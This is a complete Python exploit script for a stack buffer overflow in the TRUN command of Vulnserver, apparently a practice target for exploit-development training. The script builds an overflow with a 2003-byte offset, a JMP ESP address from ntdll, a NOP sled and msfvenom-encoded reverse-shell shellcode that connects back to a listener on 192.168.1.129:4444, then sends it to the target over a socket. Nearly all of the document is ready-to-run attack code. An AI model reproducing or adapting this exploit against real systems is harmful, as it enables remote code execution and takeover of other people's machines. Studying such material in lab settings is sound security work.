#!/usr/bin/python 
# Vulnserver TRUN command stack overflow exploit for windows 10 
# Offset is 2003 
import socket
import sys 

host = '192.168.1.10'
port = 666

try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except:
    print("Socket() Failed")
    sys.exit(1) 


# msfvenom -p windows/shell/reverse_tcp  LHOST=192.168.1.129 LPORT=4444 -e x86/shikata_ga_nai -b "\x00\xcc" -f python
buf =  ""
buf += "\xba\xf4\xfc\x18\xc3\xdd\xc1\xd9\x74\x24\xf4\x58\x33"
buf += "\xc9\xb1\x56\x31\x50\x13\x83\xe8\xfc\x03\x50\xfb\x1e"
buf += "\xed\x3f\xeb\x5d\x0e\xc0\xeb\x01\x86\x25\xda\x01\xfc"
buf += "\x2e\x4c\xb2\x76\x62\x60\x39\xda\x97\xf3\x4f\xf3\x98"
buf += "\xb4\xfa\x25\x96\x45\x56\x15\xb9\xc5\xa5\x4a\x19\xf4"
buf += "\x65\x9f\x58\x31\x9b\x52\x08\xea\xd7\xc1\xbd\x9f\xa2"
buf += "\xd9\x36\xd3\x23\x5a\xaa\xa3\x42\x4b\x7d\xb8\x1c\x4b"
buf += "\x7f\x6d\x15\xc2\x67\x72\x10\x9c\x1c\x40\xee\x1f\xf5"
buf += "\x99\x0f\xb3\x38\x16\xe2\xcd\x7d\x90\x1d\xb8\x77\xe3"
buf += "\xa0\xbb\x43\x9e\x7e\x49\x50\x38\xf4\xe9\xbc\xb9\xd9"
buf += "\x6c\x36\xb5\x96\xfb\x10\xd9\x29\x2f\x2b\xe5\xa2\xce"
buf += "\xfc\x6c\xf0\xf4\xd8\x35\xa2\x95\x79\x93\x05\xa9\x9a"
buf += "\x7c\xf9\x0f\xd0\x90\xee\x3d\xbb\xfc\xc3\x0f\x44\xfc"
buf += "\x4b\x07\x37\xce\xd4\xb3\xdf\x62\x9c\x1d\x27\xf3\x8a"
buf += "\x9d\xf7\xbb\xdb\x63\xf8\xbb\xf2\xa7\xac\xeb\x6c\x01"
buf += "\xcd\x60\x6d\xae\x18\x1c\x67\x38\x63\x48\x76\x39\x0b"
buf += "\x8a\x79\x28\x90\x03\x9f\x1a\x78\x43\x30\xdb\x28\x23"
buf += "\xe0\xb3\x22\xac\xdf\xa4\x4c\x67\x48\x4e\xa3\xd1\x20"
buf += "\xe7\x5a\x78\xba\x96\xa3\x57\xc6\x99\x28\x5d\x36\x57"
buf += "\xd9\x14\x24\x80\xbe\xd6\xb4\x51\x2b\xd6\xde\x55\xfd"
buf += "\x81\x76\x54\xd8\xe5\xd8\xa7\x0f\x76\x1e\x57\xce\x4e"
buf += "\x54\x6e\x44\xee\x02\x8f\x88\xee\xd2\xd9\xc2\xee\xba"
buf += "\xbd\xb6\xbd\xdf\xc1\x62\xd2\x73\x54\x8d\x82\x20\xff"
buf += "\xe5\x28\x1e\x37\xaa\xd3\x75\x4b\xad\x2b\x0b\x64\x16"
buf += "\x43\xf3\x34\xa6\x93\x99\xb4\xf6\xfb\x56\x9a\xf9\xcb"
buf += "\x97\x31\x52\x43\x1d\xd4\x10\xf2\x22\xfd\xf5\xaa\x23"
buf += "\xf2\x2d\x5d\x59\x7b\xd1\x9e\x9e\x95\xb6\x9f\x9e\x99"
buf += "\xc8\x9c\x48\xa0\xbe\xe3\x48\x97\xb1\x56\xec\xbe\x5b"
buf += "\x98\xa2\xc1\x49"


jmpesp = "\x37\x87\x68\x77" # jmpesp in ntdll 

evil = "A" * 2003 + jmpesp + "\x90" * 16 + buf + "C" * (5005-2003-4-16 - len(buf)) 
payload = "TRUN /.:/"+ evil 

s.connect((host,port))
print("Sending Ev1l payload.....") 
s.send(payload)
s.close() 

